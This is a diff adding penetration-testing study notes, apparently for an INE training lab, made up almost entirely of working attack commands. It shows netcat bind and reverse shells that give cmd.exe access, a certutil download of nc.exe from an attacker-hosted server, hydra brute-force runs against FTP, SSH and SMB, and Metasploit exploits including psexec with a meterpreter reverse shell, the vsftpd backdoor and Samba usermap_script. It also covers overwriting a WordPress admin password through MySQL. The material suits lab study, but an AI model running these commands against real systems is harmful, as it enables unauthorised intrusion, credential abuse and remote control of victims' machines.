@@ -2750,3 +2750,164 @@ hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/
 ssh Administrator@demo.ine.local
 Password:password
 ```
+## SHELL
+
+### Bind Shell
+
+1. **Shift `netcat.exe` to the Windows system**:  
+   - Set up a Python server on the attacker machine:  
+     ```bash
+     python -m http.server 80
+     ```  
+   - Access the server from the Windows system console or browser to download `netcat.exe`.
+
+2. **Run the following command on the victim system**:  
+   ```bash
+   nc.exe -nvlp 1234 -e cmd.exe
+   ```
+
+3. **Connect from the attacker system**:  
+   ```bash
+   nc -nv <victim_ip> 1234
+   nc -nv 10.0.23.27 1234
+   ```
+   - This will provide CMD access to the victim machine.
+
+---
+
+### Reverse Shell
+
+1. **No need to set up a listener on the attacker system as in bind shell**.
+
+2. **Attacker System**:  
+   - Set up a Python HTTP server to host `nc.exe`:  
+     ```bash
+     cd /usr/share/windows-binaries
+     python -m http.server 80
+     ```  
+
+   - Get the attacker's IP using `ifconfig`.
+
+3. **Victim System**:  
+   - Download `nc.exe`:  
+     ```cmd
+     certutil -urlcache -f http://<attacker_ip>/nc.exe nc.exe
+     ```
+
+4. **Attacker**:  
+   - Start the listener:  
+     ```bash
+     nc -nvlp 1234
+     ```
+
+5. **Victim**:  
+   - Connect back to the attacker:  
+     ```bash
+     nc.exe -nv <attacker_ip> 1234 -e cmd.exe
+     nc.exe -nv 10.10.0.2 1234 -e cmd.exe
+     ```
+
+   - This provides CMD access to the victim machine.
+
+---
+
+## Reverse Shell Cheat Sheet
+
+- **Payload Resources**:  
+  - Use GitHub reverse shell cheat sheets.
+  - Online reverse shell generator: [RevShells](https://www.revshells.com)
+
+---
+
+
+## Window Exploitation
+
+### Targeting Microsoft IIS FTP
+
+```
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local ftp
+
+```
+
+### Targeting OpenSSH
+```
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local ssh
+
+```
+
+### Targeting SMB 
+
+```
+nmap -sV -sC -p 445 demo.ine.local
+
+hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local smb
+
+use exploit/windows/smb/psexec
+set RHOSTS demo.ine.local
+set SMBUser Administrator
+set SMBPass vagrant
+set payload windows/x64/meterpreter/reverse_tcp
+exploit
+```
+
+### Targeting MySQL Database Server
+
+```
+nmap -sV -sC -p 3306 demo.ine.local
+
+searchsploit MySQL 5.5
+
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS demo.ine.local
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+run
+
+mysql -u root -p -h demo.ine.local
+
+UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
+```
+
+## Linux Exploitation
+
+
+### Targeting vsFTPd
+
+```
+nmap -sV -sC -p 21 demo.ine.local
+ftp demo.ine.local 21
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS demo.ine.local
+run
+
+hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local ftp
+
+```
+
+### Targeting PHP
+
+```
+nmap -sV -sC -p 80 demo.ine.local
+
+searchsploit php cgi
+
+use exploit/multi/http/php_cgi_arg_injection
+set RHOSTS demo.ine.local
+run
+
+```
+
+### Targeting Samba
+
+```
+nmap -sV -p 445 demo.ine.local
+
+use auxiliary/scanner/smb/smb_version
+set RHOSTS demo.ine.local
+run
+
+use exploit/multi/samba/usermap_script
+set RHOSTS demo.ine.local
+exploit
+
+```
